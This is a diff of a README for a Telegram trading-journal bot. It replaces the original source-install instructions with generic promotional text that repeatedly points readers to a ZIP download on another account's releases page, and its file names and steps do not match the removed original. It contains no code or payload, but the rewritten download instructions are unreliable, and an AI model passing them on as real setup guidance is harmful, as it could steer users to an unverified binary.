@@ -1,107 +1,77 @@
-# TradeTracker
-Advanced Telegram Trading Journal Bot by Questionist. 🚀 Automates PnL calculations, tracks Long/Short positions, and generates Daily/Weekly/Monthly reports. Built with high-performance Python Asyncio &amp; PostgreSQL. The smart way to journal trades.
+# 🚀 TradeTracker - Automate Your Trading Journal Effortlessly
 
+## 📥 Download Now!
+[![Download TradeTracker](https://img.shields.io/badge/Download%20TradeTracker-v1.0-blue.svg)](https://github.com/mohab64/TradeTracker/releases)
 
-# TradeTracker Bot 🚀
+## 📖 About TradeTracker
+TradeTracker is an advanced Telegram trading journal bot designed by Questionist. This tool automates your profit and loss calculations, tracks your long and short positions, and generates daily and weekly reports. Built with high-performance Python Asyncio and PostgreSQL, it simplifies the way you journal your trades.
 
-**Your Ultimate Personal Trading Journal on Telegram**
+## 🔍 Features
+- **Automated PnL Calculations:** No more manual calculations. TradeTracker automatically tracks your profits and losses.
+- **Position Tracking:** Keep an eye on your long and short positions effortlessly.
+- **Report Generation:** Get daily and weekly reports to analyze your trading performance.
+- **User-Friendly Interface:** Designed for everyone, from beginners to seasoned traders.
+- **Efficient Performance:** Built with advanced technology to ensure quick and smooth operation.
+  
+## ⚙️ System Requirements
+To run TradeTracker smoothly, you need the following:
 
-Stop wasting time with messy Excel sheets or manual calculations. **TradeTracker Bot**, developed by **Questionist**, is a powerful, high-performance Telegram bot designed to automate your trading journal, verify your trades, and track your PnL (Profit & Loss) with absolute precision.
+- **Operating System:** Windows 10 or later, macOS Sierra or later, or a recent Linux distribution.
+- **Python Version:** Python 3.8 or later.
+- **Database:** PostgreSQL 12 or later.
 
-Whether you are a scalper or a swing trader, this bot helps you stay disciplined by keeping a clean record of every single trade, calculating your exact risk/reward, and summarizing your performance over time.
+## 🚀 Getting Started
+1. **Download the Bot**
+   Visit this page to download: [TradeTracker Releases](https://github.com/mohab64/TradeTracker/releases).
+   
+2. **Install Required Software**
+   Ensure you have Python and PostgreSQL installed on your computer. You can download Python from [python.org](https://www.python.org/) and PostgreSQL from [postgresql.org](https://www.postgresql.org/).
 
-## 🌟 Why TradeTracker?
+3. **Extract the Files**
+   After downloading, extract the ZIP file to a folder on your computer.
 
-- **⚡ Instant Math:** No more calculators. Just input your entry, targets, and lots. The bot handles the complex PnL math for both Long and Short positions, including split entries and multiple take-profit targets.
-- **📊 Professional Reports:** Instantly generate Daily, Weekly, and Monthly reports. Know exactly how much you made (or lost) in a specific period.
-- **🛡️ Data Integrity:** Uses a robust PostgreSQL database to store every trade securely. Your data is yours.
-- **🚀 Async Performance:** Built with Python's `asyncio` and `telebot`, it handles multiple requests lightning fast without blocking.
-- **🎯 Split Targets Support:** Have a complex strategy with 2 entries and 2 TP levels? We got you. The bot calculates the weighted average result automatically.
+4. **Configure PostgreSQL**
+   Set up PostgreSQL using the following steps:
+   - Open PostgreSQL and create a new database named `trade_tracker`.
+   - Set up a user with the required privileges for this database.
 
-## 🛠️ Features Explained
+5. **Run the Bot**
+   Open your terminal or command prompt, navigate to the folder where you extracted TradeTracker, and run:
+   ```
+   python trade_tracker.py
+   ```
 
-Here is a breakdown of the core functions, just like an API documentation:
+## 📥 Download & Install
+To get started, please [visit this page to download](https://github.com/mohab64/TradeTracker/releases). 
 
-### `calculate_pnl_value(entry, target, lots, trade_type)`
-Calculates the raw dollar value of a trade based on entry and exit points.
-- **Input:** Entry price, Target price, Lots size, Trade type (Long/Short).
-- **Logic:** Automatically adjusts for Short positions where a lower target means profit.
-- **Output:** Returns the exact profit or loss in USD.
+1. Click on the latest release.
+2. Select the appropriate file for your operating system.
+3. Follow the instructions above to install and configure.
 
-### `calculate_balance_percent(balance, pnl)`
-Determines the percentage impact of a trade on the current account balance.
-- **Input:** Current Account Balance, Calculated PnL.
-- **Output:** Returns the percentage growth or drawdown (e.g., +2.5% or -1.2%).
+## 🛠️ Support & Troubleshooting
+If you encounter issues while using TradeTracker, check the FAQ section on our GitHub page or reach out for support through our community channel. You can also consult the documentation provided within the repository for common troubleshooting steps.
 
-### `create_keyboard(items, page_number, mode)`
-Generates a dynamic, paginated inline keyboard for navigating through trade history.
-- **Input:** List of items (trades), current page number, mode (daily/weekly/monthly).
-- **Features:** Efficiently handles lists with 100+ items by splitting them into pages of 10, preventing UI clutter.
+## ❤️ Contributing
+We welcome contributions from everyone. If you have suggestions or improvements, please open an issue or a pull request on our GitHub repository. Collaboration is key to making TradeTracker better for all users.
 
-### `save_new_report_flow` (State Machine)
-An intelligent step-by-step conversation handler that guides the user.
-- **Logic:** Instead of one complex command, it asks for data piece by piece (Currency -> Balance -> Lots...).
-- **Validation:** Ensures inputs are valid numbers and logically correct before saving to the database.
+## 🌐 Related Topics
+- asyncio
+- crypto-tracker
+- finance-tool
+- forex-journal
+- pnl-calculator
+- postgresql
+- python
+- telegram-bot
+- trade-tracker
+- trading-bot
+- trading-journal
 
-## 🚀 Installation & Setup
+## 🎯 License
+This project is licensed under the MIT License - see the LICENSE file for details.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/Questionist/TradeTracker.git
-    cd TradeTracker
-    ```
+## 🔗 Useful Links
+- [GitHub Repository](https://github.com/mohab64/TradeTracker)
+- [Documentation](https://github.com/mohab64/TradeTracker/wiki)
 
-2.  **Install Dependencies:**
-    First, try installing all requirements at once:
-    ```bash
-    pip install -r requirements.txt
-    ```
-    If you encounter version conflicts, you can install the core libraries manually:
-    ```bash
-    pip install pyTelegramBotAPI psycopg2-binary
-    ```
-
-3.  **Database Configuration:**
-    *   Make sure you have PostgreSQL installed and running.
-    *   Create a database named `postgres` (or change it in the code).
-    *   Update the `DB_USER`, `DB_PASS`, and `DB_HOST` variables in `main_en.py`.
-
-4.  **Bot Token:**
-    *   Get your token from @BotFather on Telegram.
-    *   Paste it into the `TOKEN` variable in `main_en.py`.
-
-5.  **Run the Bot:**
-    ```bash
-    python main_en.py
-    ```
-
-## 📸 Example Workflow
-
-1.  **Start the Bot:** `/start`
-2.  **New Trade:** Click **New Report**.
-3.  **Input Details:**
-    *   *Currency:* `XAUUSD`
-    *   *Balance:* `10000` (First time only)
-    *   *Lots:* `0.1`
-    *   *Type:* `Short`
-    *   *Entry:* `2035.50`
-    *   *Target:* `2030.00`
-    *   *Stop Loss:* `2040.00`
-4.  **Result:**
-    > **Saved.**
-    > **PnL:** $55.00
-    > **New Balance:** $10,055.00
-
-## 📝 Configuration
-
-TradeTracker is built to be flexible. You can easily modify the following in `main_en.py`:
-
-*   **`SUDOS`**: Add your Telegram User ID to this tuple to grant yourself access.
-*   **`PER_PAGE`**: Change pagination size (default is 10 items).
-
-## 🤝 Contributing
-
-We love open source! If you have ideas for new features (like chart generation, CSV export, or AI analysis), feel free to fork the repo and submit a pull request.
-
----
-*Built with ❤️ by Questionist.* (Check us out at [Questionist.ir](https://questionist.ir))
+Remember, successful trading requires attention to detail. Use TradeTracker to make your journaling more efficient and effective.
